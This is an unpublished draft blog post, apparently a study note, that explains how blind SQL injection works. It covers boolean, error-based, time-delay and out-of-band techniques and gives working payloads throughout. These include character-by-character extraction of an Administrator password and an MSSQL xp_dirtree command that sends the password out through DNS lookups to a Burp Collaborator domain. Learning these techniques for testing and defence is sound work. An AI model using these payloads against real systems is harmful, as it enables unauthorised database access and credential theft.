---
layout: post
title: Blind Injection Attacks
status: in progress
type: post
published: false
comments: true
date: 2021-10-07
---

# Blind sql injections

Not all  sql injections return results that we are able to see. This makes getting information out of them significantly harder, however still possible.

## Finding Blind injections
One way you can find blind injections is by using conditionals. For example is you have a login or tracking cookie you can add conditional injects that force pass and that force fail. For example if you are injecting into the WHERE you can:
```
stuff' AND '1'='1
stuff' AND '2'='1
```
We can see that the first injection will always return true and won't have an effect on the clause and the second will force it to always fail.

## using conditionals to extract data

Once we find injections that work with conditional statements we are able to begin extracting data 1 bit at a time from the database.

Assume there is a tale of users with column of Username and Password. We can then included the following conditional.

```SQL
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
```

In this case we select the Password From Users for the Administrator and then get the 1st char from it. We then compare that care with 'm' We can use this to cut off half the alphabet at a time till we can guess the first letter. We then move on to the second letter and so on and so forth until we are able to pull the entire password out.

## Conditional responses based on errors
You may not always get a detectable response in the returned data from you sql injection. In this case you can use conditional responses to force an detectable error. For example:
```SQL
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a  
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

In these injections you are able to see that the second one will always cause a divide by 0 error and the first one will not. These errors (or others) may be detectable while others are not. If these errors are detectable then you you can follow the same methodology as above to extract data one bit at a time. 


## Conditional time delays

Sometimes servers may properly handle errors in a way that you are unable to detect. In this case, you may be able to use conditional time delays to discover if injection is possible. For example:
```SQL
`'; IF (1=2) WAITFOR DELAY '0:0:10'--  
'; IF (1=1) WAITFOR DELAY '0:0:10'--`
```
You can see that the first line will never cause a time delay and the second line will always cause a time delay. While this may be very slow, you can use it to extract data 1 bit at a time with something like the following:
```SQL
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

## Exploiting blind injection with out-of-band techniques

However, none of these techniques may work if the server carries out the request asynchronously. It is still possible to carry out injection attacks, however it has to be done using an out-of-band communication method, The most common one is DNS. The idea is that the attacker controls the DNS server for a domain name and forces the SQL database to look up a subdomain of the controlled domain with the subdomain being dependent on what the results of the injection are. 

For example, On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specified domain:

`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`

This will cause the database to perform a lookup for the following domain:

`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

It is then possible to extract data with the following:

```SQL
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

This lets you extract data much quicker, which makes this a significantly better attack.
